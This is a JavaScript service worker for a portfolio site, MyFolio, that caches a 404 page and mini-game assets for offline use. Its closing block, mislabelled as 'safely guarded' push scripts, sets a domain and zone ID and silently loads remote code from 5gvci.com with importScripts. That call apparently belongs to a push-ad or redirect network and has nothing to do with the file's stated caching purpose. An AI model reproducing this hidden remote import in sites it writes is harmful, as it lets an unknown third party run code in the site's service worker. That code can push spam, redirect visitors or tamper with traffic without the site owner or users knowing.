/**
 * MyFolio Offline & Performance Service Worker (/sw.js)
 * Caches the 404 Matchstick Mind & Spider Cursor offline playground.
 * If internet drops or network fetch fails, automatically serves 404.html.
 */

const CACHE_NAME = 'myfolio-offline-v2';
const OFFLINE_URL = '/404.html';

const OFFLINE_ASSETS = [
  '/404.html',
  '/spider-cursor.js',
  '/matchstick/matchstick-game.css',
  '/matchstick/matchstick-game.js',
  '/matchstick/puzzle-engine.js',
  '/favicon.ico',
  '/assets/logo-3d.webp'
];

// Pre-cache the offline kit on installation
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open(CACHE_NAME).then((cache) => {
      return cache.addAll(OFFLINE_ASSETS).catch((err) => {
        console.warn('[SW] Offline assets pre-cache note:', err);
      });
    }).then(() => self.skipWaiting())
  );
});

// Activate & clean up old cache versions
self.addEventListener('activate', (event) => {
  event.waitUntil(
    caches.keys().then((keys) => {
      return Promise.all(
        keys.map((key) => {
          if (key !== CACHE_NAME) {
            return caches.delete(key);
          }
        })
      );
    }).then(() => self.clients.claim())
  );
});

// Fetch event handler: Network-first for navigation, fallback to 404 when internet is not there
self.addEventListener('fetch', (event) => {
  if (event.request.method !== 'GET') return;

  const url = new URL(event.request.url);

  // If requesting an HTML navigation page
  if (event.request.mode === 'navigate' || (event.request.headers.get('accept') && event.request.headers.get('accept').includes('text/html'))) {
    event.respondWith(
      fetch(event.request)
        .then((response) => {
          return response;
        })
        .catch(async () => {
          // Network failed (No internet connection / offline)
          const cache = await caches.open(CACHE_NAME);
          const cached404 = await cache.match(OFFLINE_URL);
          if (cached404) {
            return cached404;
          }
          return new Response('Offline: Page unavailable and network connection lost.', {
            status: 503,
            headers: { 'Content-Type': 'text/plain; charset=utf-8' }
          });
        })
    );
    return;
  }

  // For cached static assets required by 404 / spider cursor / matchstick game
  if (OFFLINE_ASSETS.some(asset => url.pathname.endsWith(asset) || url.pathname === asset)) {
    event.respondWith(
      caches.match(event.request).then((cachedResponse) => {
        if (cachedResponse) {
          fetch(event.request).then((networkResponse) => {
            if (networkResponse && networkResponse.status === 200) {
              caches.open(CACHE_NAME).then((cache) => cache.put(event.request, networkResponse));
            }
          }).catch(() => {});
          return cachedResponse;
        }
        return fetch(event.request).then((networkResponse) => {
          if (networkResponse && networkResponse.status === 200) {
            const responseClone = networkResponse.clone();
            caches.open(CACHE_NAME).then((cache) => cache.put(event.request, responseClone));
          }
          return networkResponse;
        }).catch(async () => {
          const cache = await caches.open(CACHE_NAME);
          return cache.match(event.request);
        });
      })
    );
    return;
  }
});

// Optional third-party push scripts (safely guarded)
self.options = {
  domain: "5gvci.com",
  zoneId: 12216492
};
self.lary = "";
try {
  if (self.navigator && self.navigator.onLine !== false) {
    importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw');
  }
} catch (e) {}
